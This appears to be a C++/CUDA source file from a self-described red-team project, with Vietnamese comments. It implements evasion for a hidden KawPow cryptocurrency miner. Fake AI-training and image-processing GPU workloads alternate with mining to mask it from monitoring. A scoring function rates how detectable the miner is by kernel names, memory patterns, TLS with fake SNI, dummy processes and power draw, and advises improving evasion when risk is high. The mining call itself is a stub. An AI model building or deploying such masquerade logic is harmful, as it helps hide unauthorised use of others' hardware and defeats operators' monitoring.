#include "evasion.h"
#include "cuda_helpers.cuh"
#include <cuda_runtime.h>
#include <thread>
#include <chrono>
#include <random>
#include <ctime>

namespace redteam::evasion {

// ============================================================================
// External CUDA Kernels (defined in kawpow_kernel.cu)
// ============================================================================

extern "C" void launch_fake_ai_workload(int device_id, int duration_ms);

// ============================================================================
// AI Training Simulation
// ============================================================================

void SimulateAITraining(int device_id, int duration_sec) {
    printf("[WORKLOAD-SIM] Simulating AI Training pattern on GPU %d for %ds\n",
           device_id, duration_sec);

    CUDA_CHECK(cudaSetDevice(device_id));

    auto start_time = std::chrono::steady_clock::now();
    std::mt19937 rng(time(nullptr) + device_id);

    // AI Training pattern characteristics:
    // - Bursty compute (forward + backward pass)
    // - Periodic VRAM allocation (batch loading)
    // - CPU-GPU synchronization (gradient updates)

    int iteration = 0;
    while (true) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();

        if (elapsed >= duration_sec) {
            break;
        }

        iteration++;

        // ====================================================================
        // Phase 1: Forward Pass Simulation (High GPU util)
        // ====================================================================
        printf("[AI-SIM] Iteration %d - Forward pass...\n", iteration);

        // Random batch size (128-512)
        std::uniform_int_distribution<int> batch_dist(128, 512);
        int batch_size = batch_dist(rng);

        // Allocate fake tensors (simulate batch loading)
        const size_t tensor_size = batch_size * 224 * 224 * 3 * sizeof(float);  // ImageNet-like
        float *d_input, *d_output;

        CUDA_CHECK(cudaMalloc(&d_input, tensor_size));
        CUDA_CHECK(cudaMalloc(&d_output, tensor_size));

        // Launch fake compute kernel (1-3 seconds)
        std::uniform_int_distribution<int> compute_dist(1000, 3000);
        int compute_ms = compute_dist(rng);

        launch_fake_ai_workload(device_id, compute_ms);

        // ====================================================================
        // Phase 2: Backward Pass Simulation (High GPU util)
        // ====================================================================
        printf("[AI-SIM] Iteration %d - Backward pass...\n", iteration);

        // Backward pass thường lâu hơn forward
        launch_fake_ai_workload(device_id, compute_ms * 1.5);

        // ====================================================================
        // Phase 3: CPU-GPU Sync (Lower GPU util)
        // ====================================================================
        printf("[AI-SIM] Iteration %d - Gradient sync...\n", iteration);

        // Free tensors (simulate batch completion)
        CUDA_CHECK(cudaFree(d_input));
        CUDA_CHECK(cudaFree(d_output));

        // CPU work simulation (optimizer step)
        std::this_thread::sleep_for(std::chrono::milliseconds(200));

        // ====================================================================
        // Phase 4: Cooldown / Logging (Idle time)
        // ====================================================================

        // Periodic validation/logging (every 10 iterations)
        if (iteration % 10 == 0) {
            printf("[AI-SIM] Iteration %d - Validation step (GPU idle)...\n", iteration);
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }

        // Small sleep between iterations
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }

    printf("[WORKLOAD-SIM] AI Training simulation completed (%d iterations)\n", iteration);
}

// ============================================================================
// Image Processing Simulation
// ============================================================================

void SimulateImageProcessing(int device_id, int duration_sec) {
    printf("[WORKLOAD-SIM] Simulating Image Processing on GPU %d for %ds\n",
           device_id, duration_sec);

    CUDA_CHECK(cudaSetDevice(device_id));

    auto start_time = std::chrono::steady_clock::now();

    // Image processing pattern:
    // - Sequential kernel launches (filter pipeline)
    // - Lower GPU utilization (40-70%)
    // - Frequent CPU-GPU transfers (read images, write results)

    int image_count = 0;
    while (true) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();

        if (elapsed >= duration_sec) {
            break;
        }

        image_count++;

        // Simulate processing một batch of images
        const int batch = 32;  // 32 images per batch
        const size_t image_size = 1920 * 1080 * 3 * sizeof(float);  // Full HD RGB

        float *d_image, *d_filtered;
        CUDA_CHECK(cudaMalloc(&d_image, batch * image_size));
        CUDA_CHECK(cudaMalloc(&d_filtered, batch * image_size));

        // Pipeline: Resize -> Blur -> Edge Detection -> Denoise
        // Each step = 1 fake kernel launch
        for (int filter_step = 0; filter_step < 4; filter_step++) {
            launch_fake_ai_workload(device_id, 200);  // 200ms per filter
        }

        // CPU-GPU transfer (copy results back)
        CUDA_CHECK(cudaFree(d_image));
        CUDA_CHECK(cudaFree(d_filtered));

        // CPU post-processing (encode, save)
        std::this_thread::sleep_for(std::chrono::milliseconds(300));

        if (image_count % 10 == 0) {
            printf("[IMG-SIM] Processed %d image batches\n", image_count);
        }
    }

    printf("[WORKLOAD-SIM] Image Processing simulation completed (%d batches)\n", image_count);
}

// ============================================================================
// Mixed Workload (Mining + Simulation)
// ============================================================================

void RunMixedWorkload(int device_id, double mining_duty_cycle, WorkloadType masquerade_type) {
    printf("[MIXED-WORKLOAD] Starting mixed workload on GPU %d\n", device_id);
    printf("  Mining duty cycle: %.0f%%\n", mining_duty_cycle * 100);
    printf("  Masquerade type: %d\n", (int)masquerade_type);

    CUDA_CHECK(cudaSetDevice(device_id));

    // Cycle timing
    const int cycle_duration_sec = 60;  // 1 minute cycles
    int mining_time_sec = (int)(cycle_duration_sec * mining_duty_cycle);
    int fake_time_sec = cycle_duration_sec - mining_time_sec;

    printf("[MIXED-WORKLOAD] Cycle: %ds mining + %ds fake workload\n",
           mining_time_sec, fake_time_sec);

    int cycle_count = 0;

    while (true) {
        cycle_count++;
        printf("\n[MIXED-WORKLOAD] === Cycle %d ===\n", cycle_count);

        // ====================================================================
        // Phase 1: Real Mining
        // ====================================================================
        printf("[MIXED-WORKLOAD] Phase 1: Mining (%ds)...\n", mining_time_sec);

        // TODO: Launch real KawPow mining here
        // For now, just sleep
        std::this_thread::sleep_for(std::chrono::seconds(mining_time_sec));

        // ====================================================================
        // Phase 2: Fake Workload (Masquerade)
        // ====================================================================
        printf("[MIXED-WORKLOAD] Phase 2: %s simulation (%ds)...\n",
               masquerade_type == WorkloadType::AI_TRAINING ? "AI Training" : "Image Processing",
               fake_time_sec);

        switch (masquerade_type) {
            case WorkloadType::AI_TRAINING:
                SimulateAITraining(device_id, fake_time_sec);
                break;

            case WorkloadType::IMAGE_PROCESSING:
                SimulateImageProcessing(device_id, fake_time_sec);
                break;

            case WorkloadType::SCIENTIFIC_COMPUTE:
                // TODO: Implement FFT/BLAS simulation
                launch_fake_ai_workload(device_id, fake_time_sec * 1000);
                break;

            case WorkloadType::AI_INFERENCE:
                // Inference: lower batch size, faster iterations
                launch_fake_ai_workload(device_id, fake_time_sec * 1000);
                break;
        }

        // ====================================================================
        // Phase 3: Cooldown
        // ====================================================================
        printf("[MIXED-WORKLOAD] Phase 3: Cooldown (5s)...\n");
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

// ============================================================================
// Detection Surface Calculation
// ============================================================================

DetectionSurface CalculateDetectionSurface(const SystemConfig& config) {
    DetectionSurface surface;

    // ========================================================================
    // Factor 1: Kernel Signature Visibility
    // ========================================================================

    #ifdef OBFUSCATED_BUILD
        surface.kernel_signature_visible = false;  // Obfuscated kernel names
    #else
        surface.kernel_signature_visible = true;   // Plain kawpow_search, etc.
    #endif

    // ========================================================================
    // Factor 2: Memory Pattern Visibility
    // ========================================================================

    // Nếu dùng progressive allocation + mixed memory, khó detect hơn
    bool uses_progressive_alloc = (config.evasion.real_mining_vram_ratio < 0.5);
    bool uses_memory_rotation = (config.evasion.vram_rotation_interval_sec > 0);

    surface.memory_pattern_visible = !(uses_progressive_alloc && uses_memory_rotation);

    // ========================================================================
    // Factor 3: Network Protocol Visibility
    // ========================================================================

    // TLS + fake SNI giảm visibility, nhưng stratum protocol vẫn có fingerprint
    bool uses_tls = config.mining.use_tls;
    surface.network_protocol_visible = !uses_tls;  // Simplification: TLS reduces visibility

    // ========================================================================
    // Factor 4: Process Tree Suspiciousness
    // ========================================================================

    // Có dummy workers giảm suspicion
    bool has_workers = (config.evasion.num_dummy_workers >= 4);
    surface.process_tree_suspicious = !has_workers;

    // ========================================================================
    // Factor 5: Power Profile Anomaly
    // ========================================================================

    // Duty cycle <90% và có power noise giảm anomaly
    bool has_duty_cycle = (config.evasion.duty_cycle_percent < 90);
    bool has_power_noise = (config.evasion.power_draw_noise > 10.0);

    surface.power_profile_anomalous = !(has_duty_cycle && has_power_noise);

    // ========================================================================
    // Overall Risk Score (Weighted sum)
    // ========================================================================

    double risk = 0.0;
    risk += surface.kernel_signature_visible ? 0.30 : 0.05;   // 30% weight
    risk += surface.memory_pattern_visible ? 0.25 : 0.05;     // 25%
    risk += surface.network_protocol_visible ? 0.20 : 0.05;   // 20%
    risk += surface.process_tree_suspicious ? 0.15 : 0.05;    // 15%
    risk += surface.power_profile_anomalous ? 0.10 : 0.05;    // 10%

    surface.detection_risk_score = risk;

    return surface;
}

// ============================================================================
// Evasion Report Generation (JSON format)
// ============================================================================

std::string GenerateEvasionReport(const DetectionSurface& surface) {
    // Simple JSON generation (trong production dùng nlohmann/json)
    char json_buf[2048];

    snprintf(json_buf, sizeof(json_buf),
        "{\n"
        "  \"detection_surface\": {\n"
        "    \"kernel_signature_visible\": %s,\n"
        "    \"memory_pattern_visible\": %s,\n"
        "    \"network_protocol_visible\": %s,\n"
        "    \"process_tree_suspicious\": %s,\n"
        "    \"power_profile_anomalous\": %s,\n"
        "    \"overall_risk_score\": %.3f\n"
        "  },\n"
        "  \"risk_assessment\": {\n"
        "    \"level\": \"%s\",\n"
        "    \"recommended_action\": \"%s\"\n"
        "  },\n"
        "  \"timestamp\": %ld,\n"
        "  \"research_build\": true\n"
        "}\n",
        surface.kernel_signature_visible ? "true" : "false",
        surface.memory_pattern_visible ? "true" : "false",
        surface.network_protocol_visible ? "true" : "false",
        surface.process_tree_suspicious ? "true" : "false",
        surface.power_profile_anomalous ? "true" : "false",
        surface.detection_risk_score,
        surface.detection_risk_score > 0.7 ? "HIGH" :
            surface.detection_risk_score > 0.4 ? "MEDIUM" : "LOW",
        surface.detection_risk_score > 0.7 ? "Improve evasion techniques" :
            surface.detection_risk_score > 0.4 ? "Monitor detection surface" :
            "Current evasion sufficient",
        time(nullptr)
    );

    return std::string(json_buf);
}

} // namespace redteam::evasion
